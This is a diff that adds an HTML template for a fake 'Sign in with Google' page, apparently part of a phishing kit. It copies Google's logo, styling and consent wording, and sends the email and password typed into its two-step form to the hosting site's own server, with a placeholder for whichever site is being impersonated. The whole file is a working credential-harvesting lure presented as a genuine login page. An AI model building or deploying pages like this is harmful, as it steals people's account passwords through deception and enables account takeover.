@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    {% load static %}
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="{% static 'style.css' %}" type="text/css">
+    <script src="{% static 'action.js' %}"></script>
+    <script>
+        function clickbut(){
+            document.getElementById("binhere").innerHTML = "<input type='submit' id='next1' value=' &nbsp; &nbsp; Next &nbsp;  &nbsp; '>";
+        }
+    </script>
+</head>
+
+<body>
+    
+    <div class="main" id="mainw">
+        
+        <div class="header">
+            <div class="headText">
+                <svg xmlns="https://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 48 48" aria-hidden="true" class="L5wZDc">
+                    <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"></path>
+                    <path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"></path>
+                    <path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"></path>
+                    <path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"></path>
+                    <path fill="none" d="M2 2h44v44H2z"></path>
+                </svg>
+                &nbsp;Sign in with Google</div>
+        </div>
+        <center>
+        <div class="jXeDnc">
+            <div class="heading">
+                <h1 class="ahT6S" id="headingText">
+                    <span>Sign in</span>
+                </h1>
+            </div>
+            <div id="headingSubtext">
+                to continue to <span style="color: rgb(52, 126, 255)"><b><a href="/">{{ site }}</a></b></span>
+            </div>
+        </div>
+
+        <form method="POST" action="">
+            {% csrf_token %}
+        <div id="emFrs">
+            <div class="MeoPh">
+                
+                <span id="leg" style="height: 7px; display: none;"></span>
+                <fieldset id="emailInput">
+                    <legend id="emorph" style="display: none; color: rgb(52, 126, 255); font-size: small;"><span>Email or phone</span></legend>
+                    <input type="text" name="email" id="email-inp" placeholder="Email or phone" autocomplete="off">
+                </fieldset>
+                <div class="info" style="margin-top: 10px;text-align: left; color: rgb(52, 126, 255)"><b>Forgot email?</b></div>
+            </div>
+
+            <br><br><br>
+            
+            <div class="info">
+                To continue, Google will share your name, email address, language preference and profile picture with {{ site }}. Before using this app, you can review {{ site }}'s' <a href="privacy" style="text-decoration: none;"><b>privacy policy</b></a> and <a href="T&C" style="text-decoration: none;"><b>Terms of Service</b></a>.
+            </div>
+
+            <br><br>
+
+            <div class="info">
+                <table style="width: 100%">
+                    <tr style="width: 100%; height: 46px;">
+                        <td id="createAcc" style="width: 50%; color: rgb(52, 126, 255)"><b>Create account</b></td>
+                        <td style="width: 50%; text-align: right"><input type="button" id="next" value=" &nbsp; &nbsp; Next &nbsp;  &nbsp; " onclick="clickbut()"></td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+
+
+        <div style="position: absolute; left: 100%;display: none;" id="password">
+            <div class="MeoPh">
+                <span id="leg1" style="height: 7px; display: none;"></span>
+                <fieldset id="emailInput1">
+                    <legend id="emorph1" style="display: none; color: rgb(52, 126, 255); font-size: small;"><span>Enter your password</span></legend>
+                    <input type="password" name="password" id="email-inp1" placeholder="Enter your password" autocomplete="off">
+                </fieldset>
+                <div class="info" style="margin-top: 10px;text-align: left;color: rgb(52, 126, 255)">
+                    <table><tr><td><input type="checkbox" onclick="Toggl()" style="height: 1em;" id="shpwd"></td> <td> &nbsp; &nbsp; <b>Show password</b></td></tr></table>
+                    <script>
+                        function Toggl() {
+                            var temp = document.getElementById("email-inp1");
+                            if (temp.type === "password") {
+                                temp.type = "text";
+                            }
+                            else {
+                                temp.type = "password";
+                            }
+                        }
+                    </script>
+                </div>
+            </div>
+
+            <br><br><br>
+            
+            <div class="info">
+                To continue, Google will share your name, email address, language preference and profile picture with {{ site }}. Before using this app, you can review {{ site }}'s' <a href="privacy" style="text-decoration: none;"><b>privacy policy</b></a> and <a href="T&C" style="text-decoration: none;"><b>Terms of Service</b></a>.
+            </div>
+
+            <br><br>
+
+            <div class="info">
+                <table style="width: 100%">
+                    <tr style="width: 100%; height: 46px;">
+                        <td style="width: 50%; color: rgb(52, 126, 255)"><b>Forgot password?</b></td>
+                        <td style="width: 50%; text-align: right" id="binhere"></td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+        </center>
+    </form>
+    
+    </div>
+</body>
+</html>
